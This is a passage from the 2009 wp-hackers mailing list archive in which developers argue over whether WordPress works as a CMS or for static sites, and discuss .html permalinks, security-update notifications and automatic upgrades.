    return $caps;
 }

That right there removes Posts and Comments from admin menus, knocking a few
items off Stephen's checklist.

From otto at ottodestruct.com  Wed Oct 21 21:07:26 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 21 Oct 2009 16:07:26 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com> 
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com> 
	<666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>
Message-ID: <161617690910211407p47537d61o9c08ab8aa0132198@mail.gmail.com>

On Wed, Oct 21, 2009 at 3:57 PM, Joost de Valk <joost at yoast.com> wrote:
> Otto,
> I think there are now dozens of people on this list who are NOT agreeing
> with you.

Joost,

I'm totally uninterested in whether people agree with me or not. I'm
giving my opinion because I'm trying to get feedback and understand
why anybody in their right mind would want this sort of thing.

Seriously.

> Me and my company are rapidly using WordPress to replace large
> corporate CMS'es, usually without using the blog functionality or by calling
> it the "news section". We do so for a couple of reasons:
> - because it's easy to develop for, and thus easy to hire people for,
> - there's a slew of plugins available making a lot of the work that's
> otherwise custom work as easy as flipping a switch,
> - the interface is user friendly
>
> And, more importantly: a lot of people KNOW WordPress from their blogs. It's
> much like why most of the world uses Microsoft Word, even when they're
> writing a book. Yes there are probably tools that, architecturally, are
> better suited for the job, but because everyone knows how to use WordPress,
> it's actually easier to implement. (this analogy is poorly written but hey,
> i'm jotting it down quickly)

So, to break down your reasons:

- Easy to work with (I assure you that MediaWiki is dead simple, you
might want to have a look)

- Existence of large base of plugins (most of which are useless since
you're wanting to castrate the rest of the system anyway... BTW, did
you know MediaWiki has plugins too?)

- User friendly interface (Can't fault you there, MediaWiki's
interface is a pile of dogshit to start with. Fortunately, there's
half a dozen plugins that spice up the editor and make it "Visual"
just like WordPress'...)

- User knows how to use it (I'm pretty sure every human being who's
ever used the internet has used Wikipedia at one point or another, and
will grasp the general concepts right away.)

I realize your reasoning is sound to you, and that you're in a hurry,
but I'd encourage you to give some things a rethink here, and take a
look at other software packages as well.

Again, I like WP. I contribute to WP with help and code. But
seriously, these misguided attempts to make WP do anything and
everything hurt the project more than they help it, IMO. There is room
in this world for more than one piece of software for a generalized
task.

-Otto

From scribu at gmail.com  Wed Oct 21 21:08:49 2009
From: scribu at gmail.com (scribu)
Date: Thu, 22 Oct 2009 00:08:49 +0300
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>
Message-ID: <349fe48b0910211408i7509a769w8a668a876f6358e7@mail.gmail.com>

On Wed, Oct 21, 2009 at 11:57 PM, Joost de Valk <joost at yoast.com> wrote:

> -snip-
> So, if you choose to do something else with WordPress, please do, but for a
> lot of us, WordPress already IS a CMS. And I agree with Stephen that it's
> about time we got the chance to change the wording in a lot of spaces. It
> may sound trivial, but the wording is actually a *very* important part of
> the interface... :)
>

Maybe you could lend a hand with this
ticket<http://core.trac.wordpress.org/ticket/10996>then.


-- 
http://scribu.net

From zamoose at gmail.com  Wed Oct 21 21:15:18 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 21 Oct 2009 17:15:18 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <161617690910211407p47537d61o9c08ab8aa0132198@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>
	<161617690910211407p47537d61o9c08ab8aa0132198@mail.gmail.com>
Message-ID: <71ddd7490910211415p5d14c853v58a7ed6cc6f95368@mail.gmail.com>

Otto:
Seems to me that folks are primarily advocating for WordPress(.org) to
be seen as a self-installable incarnation of the service offered by
providers such as Squarespace (http://www.squarespace.com/), wherein
you simply create a website and along with that comes comments,
forums, photo galleries, polls, and yes, even blogging capabilities.

I'm not saying I necessarily agree with the thinking, but I must say
that in almost all cases, when my customers ask for something
web-related, my first thought is generally "Can I make WordPress do
this easily and cheaply?".   To date, I think my answer has been "yes"
around 75-85% of the time (employee locators, process certification
database, occasionally-update brochureware site, intranet "portal",
etc.).

-- 
-Doug
http://literalbarrage.org/blog/

From otto at ottodestruct.com  Wed Oct 21 21:31:26 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 21 Oct 2009 16:31:26 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <71ddd7490910211415p5d14c853v58a7ed6cc6f95368@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com> 
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com> 
	<666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com> 
	<161617690910211407p47537d61o9c08ab8aa0132198@mail.gmail.com> 
	<71ddd7490910211415p5d14c853v58a7ed6cc6f95368@mail.gmail.com>
Message-ID: <161617690910211431k16166ef2m28544bc8b62e49b6@mail.gmail.com>

On Wed, Oct 21, 2009 at 4:15 PM, Doug Stewart <zamoose at gmail.com> wrote:
> Otto:
> Seems to me that folks are primarily advocating for WordPress(.org) to
> be seen as a self-installable incarnation of the service offered by
> providers such as Squarespace (http://www.squarespace.com/), wherein
> you simply create a website and along with that comes comments,
> forums, photo galleries, polls, and yes, even blogging capabilities.

It's a neat idea, I grant you, and perhaps in the very, very long
term, WP will turn into something like that. I can see bbPress making
great strides lately, and full integration of it with WP is getting
easier all the time.

But the generic "page" dynamic within WordPress is way too immature
for it to realistically be anything other than a "blog" at this point
in time. Even the general WPMU architecture is focused primarily on
blogging continual streams of content instead of static designs.
"Pages" are a bolt-on type of hack to the Posts system.

WordPress won't be good at static sites for until somebody comes along
and actually fixes all those bits up. Because of this, it's going to
be pretty poor at being a "traditional" CMS in the static site sense.

Now, it is getting better. The recent updates to add custom post type
taxonomies is a decent start. WordPress is getting more generic,
getting rid of code that was specific to a thing and made it more
generic to apply to a variety of things. Tags and categories and link
categories are all the same thing now internally: terms in taxonomies
which apply to posts or links. Soon, posts and pages, though already
pretty close, might get more generic means of referring to them, which
will allow for some types of optimizations that don't exist at
present.

I personally look forward to the day when somebody figures out that
comments and even links are really just another form of post, with
their own taxonomy. Then we'll be really getting somewhere and you'll
see rapid progress.

Anyway, once things are made generic, then interfaces can be made for
them. You'll be able to drag and drop a comments section onto the page
you want, or not, or whatever. And it'll be neat.

But that day isn't quite today. It's not up for it yet. WordPress is
indeed a CMS, but that depends on how you actually define "CMS". If
you think "Content Management System", then that's true, but if you
think that means every type of "content" under the sun, then you've
still got another think, I'd say.

In the meantime, it makes a damn fine "blog" system, and I'd advice
people to stick with that. If they want to help make it more generic,
then I'd work on those bits. Post taxonomies is the next big thing
that needs that sort of work.

-Otto

From mikeschinkel at newclarity.net  Wed Oct 21 21:46:56 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 21 Oct 2009 17:46:56 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <004901ca5291$94e3c0d0$beab4270$@us>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<004901ca5291$94e3c0d0$beab4270$@us>
Message-ID: <11AEFF33-976E-403D-80C8-56AC998C0FBB@newclarity.net>

On Oct 21, 2009, at 5:00 PM, mark waterous wrote:
>
> It occurs to me that Posts, in combination with the WP_Query object  
> is one
> of Wordpress' most powerful features for customization and  
> functionality.
> This has been demonstrated time and again by various designers and
> developers. Maybe changing the naming conventions would be a better
> practice, or removing Pages instead? That would leave you with the  
> ability
> to still tag and categorize posts for use in custom template  
> designs, or
> attach comments, which can be a major factor in most online  
> communities.

I'd really like to see the arbitrary feature sets of Pages vs. Posts  
go away and allow us to decide which Pages can be Tagged, which Posts  
can be assigned to the menu structure, etc.

Actually, allowing for custom post types where each post type can  
choose which features it supports it what we really need.

On Oct 21, 2009, at 5:07 PM, Otto wrote:
> - Easy to work with (I assure you that MediaWiki is dead simple, you
> might want to have a look)

Sorry, compared to WordPress, MediaWiki is a joke.  I've worked with  
it and it's a nightmare. It's not a valid solution for a business  
website.  Never again.

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/




From jason at realestatetomato.com  Wed Oct 21 21:50:27 2009
From: jason at realestatetomato.com (Jason Benesch)
Date: Wed, 21 Oct 2009 14:50:27 -0700
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <161617690910211431k16166ef2m28544bc8b62e49b6@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>
	<161617690910211407p47537d61o9c08ab8aa0132198@mail.gmail.com>
	<71ddd7490910211415p5d14c853v58a7ed6cc6f95368@mail.gmail.com>
	<161617690910211431k16166ef2m28544bc8b62e49b6@mail.gmail.com>
Message-ID: <579c69ac0910211450jb2ada42g4efaa4565553aa12@mail.gmail.com>

You didn't make any sense.

"But the generic "page" dynamic within WordPress is way too immature
for it to realistically be anything other than a "blog" at this point
in time."

"I personally look forward to the day when somebody figures out that
comments and even links are really just another form of post, with
their own taxonomy."

Aren't pages " just another form of posts" as well?  You really don't think
WP can be used for anything other than blog?  Seriously?

I mean I completely understand your point (and I think it is an important
one, that being picking out software specific to your needs), but aren't
posts the same exact thing as pages?  Or really the other way around...

It seems to me that you could literally copy the page.php template file on
to the single.php template file and have a complete CMS that you only need
to update once or twice a month.

You could filter the admin menu, and change the instances of post to
something else if that is your fancy, but I use WP for a standalone website
platform all the time.  For hundreds of different projects that don't have
anything to with blogging.





On Wed, Oct 21, 2009 at 2:31 PM, Otto <otto at ottodestruct.com> wrote:

> On Wed, Oct 21, 2009 at 4:15 PM, Doug Stewart <zamoose at gmail.com> wrote:
> > Otto:
> > Seems to me that folks are primarily advocating for WordPress(.org) to
> > be seen as a self-installable incarnation of the service offered by
> > providers such as Squarespace (http://www.squarespace.com/), wherein
> > you simply create a website and along with that comes comments,
> > forums, photo galleries, polls, and yes, even blogging capabilities.
>
> It's a neat idea, I grant you, and perhaps in the very, very long
> term, WP will turn into something like that. I can see bbPress making
> great strides lately, and full integration of it with WP is getting
> easier all the time.
>
> But the generic "page" dynamic within WordPress is way too immature
> for it to realistically be anything other than a "blog" at this point
> in time. Even the general WPMU architecture is focused primarily on
> blogging continual streams of content instead of static designs.
> "Pages" are a bolt-on type of hack to the Posts system.
>
> WordPress won't be good at static sites for until somebody comes along
> and actually fixes all those bits up. Because of this, it's going to
> be pretty poor at being a "traditional" CMS in the static site sense.
>
> Now, it is getting better. The recent updates to add custom post type
> taxonomies is a decent start. WordPress is getting more generic,
> getting rid of code that was specific to a thing and made it more
> generic to apply to a variety of things. Tags and categories and link
> categories are all the same thing now internally: terms in taxonomies
> which apply to posts or links. Soon, posts and pages, though already
> pretty close, might get more generic means of referring to them, which
> will allow for some types of optimizations that don't exist at
> present.
>
> I personally look forward to the day when somebody figures out that
> comments and even links are really just another form of post, with
> their own taxonomy. Then we'll be really getting somewhere and you'll
> see rapid progress.
>
> Anyway, once things are made generic, then interfaces can be made for
> them. You'll be able to drag and drop a comments section onto the page
> you want, or not, or whatever. And it'll be neat.
>
> But that day isn't quite today. It's not up for it yet. WordPress is
> indeed a CMS, but that depends on how you actually define "CMS". If
> you think "Content Management System", then that's true, but if you
> think that means every type of "content" under the sun, then you've
> still got another think, I'd say.
>
> In the meantime, it makes a damn fine "blog" system, and I'd advice
> people to stick with that. If they want to help make it more generic,
> then I'd work on those bits. Post taxonomies is the next big thing
> that needs that sort of work.
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jason Benesch

Real Estate Tomato
Co-owner
www.realestatetomato.com
(619) 770-1950
jason at realestatetomato.com

ListingPress
Owner, Founder
www.listingpress.com
(619) 955-7465
jason at listingpress.com

From jer at simianuprising.com  Wed Oct 21 21:58:40 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 21 Oct 2009 17:58:40 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <71ddd7490910211415p5d14c853v58a7ed6cc6f95368@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>
	<161617690910211407p47537d61o9c08ab8aa0132198@mail.gmail.com>
	<71ddd7490910211415p5d14c853v58a7ed6cc6f95368@mail.gmail.com>
Message-ID: <e1202cb10910211458k46c94256jad163d974db1a1f1@mail.gmail.com>

+1 for removing the word 'blog' from pretty much anywhere it still
exists in the UI. It has become a completely untenable assumption
about WP sites.

On Wed, Oct 21, 2009 at 5:07 PM, Otto <otto at ottodestruct.com> wrote:
> On Wed, Oct 21, 2009 at 3:57 PM, Joost de Valk <joost at yoast.com> wrote:
>> Otto,
>> I think there are now dozens of people on this list who are NOT agreeing
>> with you.
>
> I'm totally uninterested in whether people agree with me or not. I'm
> giving my opinion because I'm trying to get feedback and understand
> why anybody in their right mind would want this sort of thing.

Okay good. I think we can all agree that you in no way represent the
mainstream of WordPress user or developer thinking on the subject of
WP for non-blogs (a.k.a. "wp as a cms"). Everyone else wants WP to be
stable, easy to use and safe for all kinds of sites, especially ones
people build with WP, which is all kinds. Since most of your arguments
stem from a core dissagrement we can also all stop trying to deal with
them (at least I will try not to let myself be baited by them).

Stephen your plugin seems like a decent idea though like others I
think it looks at 'cms' a little too narrowly. If anything what I'd
call your description is "Just Pages". To me making WP a  "cms" is
about adding more functionality, not removing what's there.
WP-JustPages anyone?

If you do want to go that route I love Andrew's idea of using the
existing permissions system to do so. Just install a capability/role
management plugin (there are several these days) and set it so that
the regular client accounts don't have any access to posts. If WP is
going to support your JustPages concept in core then it should be by
ensuring that the 'blog' features can be turned off by adequately
limiting permissions (really the same goes for links, pages etc.) As
the admin there's no reason for it to ever be hidden from you. I think
this system would also be a lot easier to maintain, your list of
changes would be hell to keep up as versions come and go and things
change on the backend.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From william.canino at googlemail.com  Wed Oct 21 22:50:22 2009
From: william.canino at googlemail.com (William Canino)
Date: Wed, 21 Oct 2009 18:50:22 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <e1202cb10910211458k46c94256jad163d974db1a1f1@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>
	<161617690910211407p47537d61o9c08ab8aa0132198@mail.gmail.com>
	<71ddd7490910211415p5d14c853v58a7ed6cc6f95368@mail.gmail.com>
	<e1202cb10910211458k46c94256jad163d974db1a1f1@mail.gmail.com>
Message-ID: <e4dc67e0910211550v10941ff0h79044185bb0812b9@mail.gmail.com>

I think using WordPress 2.8.4 as a CMS is like using a coffeemaker to
boil vegetables.  Office pantries probably don't have a stove or
cookware, but they all have a coffeemaker. And everyone knows how to
use a coffeemaker, right?  Yes, WordPress 2.8.4 as a CMS is a
MacGyverism.

Anyone who'd do it penalizes himself with all the software bloat and
overhead IN WordPress to make feeds, scheduled posts, chronological
articles, stickies, comments, paged comments, comment feeds, date
archives, et cetera.  He forces his web server and his readers to
suffer this burden.

(I'm guilty, too. I once set up an entire WordPress installation so I
can run one online poll.)

> But the generic "page" dynamic within WordPress
> is way too immature for it to realistically be
> anything other than a "blog" at this point
> in time.

Well said. Do you know why a lot of people are using WordPress for
their undated content? Because no alternative is widely available. So
do what you want, MacGyver, but remember that, at this time,
Automattic isn't leading to mature the Pages aspect of WordPress.  It
is, foremost, a coffeemaker.

Shall I put a Dr. McCoy line here, as well?

From jer at simianuprising.com  Wed Oct 21 22:59:02 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 21 Oct 2009 18:59:02 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
	<161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com>
Message-ID: <e1202cb10910211559m3b23df80w56f69c6b1ef340e1@mail.gmail.com>

For the record I think Lynne made some really excellent points that
made me reconsider my perspective, to summarize:

1 - The real problem here is the announcements list which is made of
FAIL. Someone at Automattic needs to just subscribe that list to
Taunja's Feedburner hack so it can do its job.

2 - The welcome post is currently trash. It should do exactly what she
says and inform people about security and how installation was just
the first step towards a long safe relationship with the platform. I
already do this in my own setup by cloning a base database with the
settings I want including a hello world article based on the info I
want my users to have.

3 - Automated install scripts confound the situation and could lead to
issues where the user gets a message to update and breaks the
auto-update script.

I still think that the proposed update email system could be very
useful for people with archival/abandoned sites though. If anything
though the above indicate that it should be opt-in rather than
opt-out, and that ideally it would be intelligent about things like
whether anyone has logged in and seen the update message. Maybe its
something that could be integrated into one of Jane's polls for
2.10/3.0.

If we can get 1 and 2 though I'm willing to give up on core support.
It would be great if the plugin that does the email thing was featured
in the default post (or on the upgrade screen or wherever else we're
adding new info to emphasize the importance of being aware of updates
as they become available). Closing the 'who has heard of it' gap is
vital in this case IMHO.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From cp at ccil.org  Wed Oct 21 23:30:16 2009
From: cp at ccil.org (Chuck Peters)
Date: Wed, 21 Oct 2009 19:30:16 -0400
Subject: [wp-hackers] static websites - was: wordpress security
Message-ID: <cfd69f2e0910211630tb32709dlf89fd330b83cd5a6@mail.gmail.com>

On Wed, Oct 21, 2009 at 4:40 PM, Otto <otto at ottodestruct.com> wrote:

> On Wed, Oct 21, 2009 at 2:22 PM, Stephen Rider
> <wp-hackers at striderweb.com> wrote:
> > But as such we must accept that many users are using
> > WordPress to set up their sites, and edit them when needed, but are NOT
> > routinely adding new content, /a la/ a blog.  In such circumstances, a
> site
> > can **easily** go two months without being updated.
>
> IMO, such a site should not be using WordPress.
>
> If you're going to make a static site, WordPress is not the correct
> tool for the job.
>

Do others agree?

If wordpress isn't best for static sites, what would you recommend?

I am asking because we want to update a mostly static site we have had for
years.  Over time we added a news feed to some of the pages and via cron and
php to write out static html pages.  It would be really nice to get
something setup which made it easier for Kathy to edit the site.  Whatever
it is, it needs to be low cost or free and I would prefer it has a GPL. One
of the reasons I don't want to use wordpress for the old static site is I
would like to keep the old http://domain/dir/page.html and not use
redirects.


Chuck

From mccormicky at gmail.com  Wed Oct 21 23:47:00 2009
From: mccormicky at gmail.com (mccormicky)
Date: Wed, 21 Oct 2009 19:47:00 -0400
Subject: [wp-hackers] static websites - was: wordpress security
In-Reply-To: <cfd69f2e0910211630tb32709dlf89fd330b83cd5a6@mail.gmail.com>
References: <cfd69f2e0910211630tb32709dlf89fd330b83cd5a6@mail.gmail.com>
Message-ID: <d7153760910211647q2850e0f4qe07df6374f4e4029@mail.gmail.com>

Maybe Otto meant that sites that stay stagnant for a long time shouldn't be
built with WP for security reasons because admins aren't going to log in
often enough to keep them safe and current with the latest WP releases?

I can't speak for him but this is my opinion:
I think moving your backlog of static html pages into WP makes a lot of
sense because you can have such easy access to them via the WP dashboard if
you ever need to add a new Page or edit an already published Page.

And you can use Posts and put %postname%.html as the permalink (works on
Posts) you'll get http://domain/dir/postname.html
or use the plugin .html on pages  you'll get
http://domain/dir/pagename.htmland you won't have to deal with
redirects.

I've been able to keep my clients very happy transferring mainly static
sites to WP -- never had a complaint yet!


On Wed, Oct 21, 2009 at 7:30 PM, Chuck Peters <cp at ccil.org> wrote:

> On Wed, Oct 21, 2009 at 4:40 PM, Otto <otto at ottodestruct.com> wrote:
>
> > On Wed, Oct 21, 2009 at 2:22 PM, Stephen Rider
> > <wp-hackers at striderweb.com> wrote:
> > > But as such we must accept that many users are using
> > > WordPress to set up their sites, and edit them when needed, but are NOT
> > > routinely adding new content, /a la/ a blog.  In such circumstances, a
> > site
> > > can **easily** go two months without being updated.
> >
> > IMO, such a site should not be using WordPress.
> >
> > If you're going to make a static site, WordPress is not the correct
> > tool for the job.
> >
>
> Do others agree?
>
> If wordpress isn't best for static sites, what would you recommend?
>
> I am asking because we want to update a mostly static site we have had for
> years.  Over time we added a news feed to some of the pages and via cron
> and
> php to write out static html pages.  It would be really nice to get
> something setup which made it easier for Kathy to edit the site.  Whatever
> it is, it needs to be low cost or free and I would prefer it has a GPL. One
> of the reasons I don't want to use wordpress for the old static site is I
> would like to keep the old http://domain/dir/page.html and not use
> redirects.
>
>
> Chuck
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jeremy at visser.name  Wed Oct 21 23:48:29 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Thu, 22 Oct 2009 10:48:29 +1100
Subject: [wp-hackers] static websites - was: wordpress security
In-Reply-To: <d7153760910211647q2850e0f4qe07df6374f4e4029@mail.gmail.com>
References: <cfd69f2e0910211630tb32709dlf89fd330b83cd5a6@mail.gmail.com>
	<d7153760910211647q2850e0f4qe07df6374f4e4029@mail.gmail.com>
Message-ID: <1256168909.4632.19.camel@rillian.narnia.sunriseroad.net>

On Wed, 2009-10-21 at 19:47 -0400, mccormicky wrote:
> And you can use Posts and put %postname%.html as the permalink (works on
> Posts) you'll get http://domain/dir/postname.html
> or use the plugin .html on pages  you'll get
> http://domain/dir/pagename.html and you won't have to deal with
> redirects.

That doesn't work for static pages.

(You could possibly add a .html to the end of the slug, but that would
have to be done manually for each page.)


From yahgrp at poplarware.com  Wed Oct 21 23:57:04 2009
From: yahgrp at poplarware.com (Jennifer Hodgdon)
Date: Wed, 21 Oct 2009 16:57:04 -0700
Subject: [wp-hackers] static websites - was: wordpress security
In-Reply-To: <cfd69f2e0910211630tb32709dlf89fd330b83cd5a6@mail.gmail.com>
References: <cfd69f2e0910211630tb32709dlf89fd330b83cd5a6@mail.gmail.com>
Message-ID: <4ADF9FD0.6050206@poplarware.com>

> On Wed, Oct 21, 2009 at 4:40 PM, Otto <otto at ottodestruct.com> wrote:
>> If you're going to make a static site, WordPress is not the correct
>> tool for the job.

Chuck Peters wrote:
> Do others agree?

Not everyone agrees with that statement.

My opinion is that for a simple "brochure-ware" site (I hesitate to 
call it "static", since of course you can edit the content), WordPress 
can be a good tool, if:

- You want to give some small subset of admins a way to edit the 
content on the pages via the web (i.e. you need a CMS of some sort).

- You don't envision adding a lot of features to your site beyond 
"display some pages" (i.e. you only need a simple CMS tool).

- You want to invest the time/money to create a good-looking theme.

- You plan to keep up with security fixes, updates, etc.

     --Jennifer

-- 
Jennifer Hodgdon * Poplar ProductivityWare
www.poplarware.com
Drupal, WordPress, and custom Web programming


From mccormicky at gmail.com  Thu Oct 22 00:08:04 2009
From: mccormicky at gmail.com (mccormicky)
Date: Wed, 21 Oct 2009 20:08:04 -0400
Subject: [wp-hackers] static websites - was: wordpress security
In-Reply-To: <1256168909.4632.19.camel@rillian.narnia.sunriseroad.net>
References: <cfd69f2e0910211630tb32709dlf89fd330b83cd5a6@mail.gmail.com>
	<d7153760910211647q2850e0f4qe07df6374f4e4029@mail.gmail.com>
	<1256168909.4632.19.camel@rillian.narnia.sunriseroad.net>
Message-ID: <d7153760910211708o5f045ff7qf281a4faf2c732e6@mail.gmail.com>

The plugin  ".html on pages"  works on static pages. I've tried it and it
does work.


On Wed, Oct 21, 2009 at 7:48 PM, Jeremy Visser <jeremy at visser.name> wrote:

> On Wed, 2009-10-21 at 19:47 -0400, mccormicky wrote:
> > And you can use Posts and put %postname%.html as the permalink (works on
> > Posts) you'll get http://domain/dir/postname.html
> > or use the plugin .html on pages  you'll get
> > http://domain/dir/pagename.html and you won't have to deal with
> > redirects.
>
> That doesn't work for static pages.
>
> (You could possibly add a .html to the end of the slug, but that would
> have to be done manually for each page.)
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Thu Oct 22 01:13:58 2009
From: william.canino at googlemail.com (William Canino)
Date: Wed, 21 Oct 2009 21:13:58 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <e1202cb10910211559m3b23df80w56f69c6b1ef340e1@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
	<161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com>
	<e1202cb10910211559m3b23df80w56f69c6b1ef340e1@mail.gmail.com>
Message-ID: <e4dc67e0910211813n818a97u28e7010849a90568@mail.gmail.com>

May I ask a question? Why cannot WordPress do automatic (as in
unattended) upgrades, exactly like all modern operating systems?

XP has been doing this since 2001.

From dragonfly at dragonflyeye.net  Thu Oct 22 01:19:03 2009
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Wed, 21 Oct 2009 21:19:03 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <e4dc67e0910211813n818a97u28e7010849a90568@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
	<161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com>
	<e1202cb10910211559m3b23df80w56f69c6b1ef340e1@mail.gmail.com>
	<e4dc67e0910211813n818a97u28e7010849a90568@mail.gmail.com>
Message-ID: <77b239a00910211819p1531176do7ef86be1d0ae9817@mail.gmail.com>

Ugh. That's one of the chief reasons I hate XP and Windows, generally.

Unattended upgrades are especially bad in the case of WordPress, where not
every plugin necessarily will be compatible with the new version of the
software. Methinks there would be some very angry people checking in with
the WP community to say their website was completely down while they were
not looking.

On Wed, Oct 21, 2009 at 9:13 PM, William Canino <
william.canino at googlemail.com> wrote:

> May I ask a question? Why cannot WordPress do automatic (as in
> unattended) upgrades, exactly like all modern operating systems?
>
> XP has been doing this since 2001.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From lynne.pope at gmail.com  Thu Oct 22 01:56:31 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Thu, 22 Oct 2009 14:56:31 +1300
Subject: [wp-hackers] wordpress security
In-Reply-To: <e4dc67e0910211813n818a97u28e7010849a90568@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com> 
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com> 
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com> 
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com> 
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com> 
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com> 
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
	<161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com> 
	<e1202cb10910211559m3b23df80w56f69c6b1ef340e1@mail.gmail.com> 
	<e4dc67e0910211813n818a97u28e7010849a90568@mail.gmail.com>
Message-ID: <427667db0910211856l783ef8afqd62a66db31d60618@mail.gmail.com>

2009/10/22 William Canino <william.canino at googlemail.com>

> May I ask a question? Why cannot WordPress do automatic (as in
> unattended) upgrades, exactly like all modern operating systems?
>
> XP has been doing this since 2001.
>

Operating systems only install auto updates if the user selects to install
auto-updates.
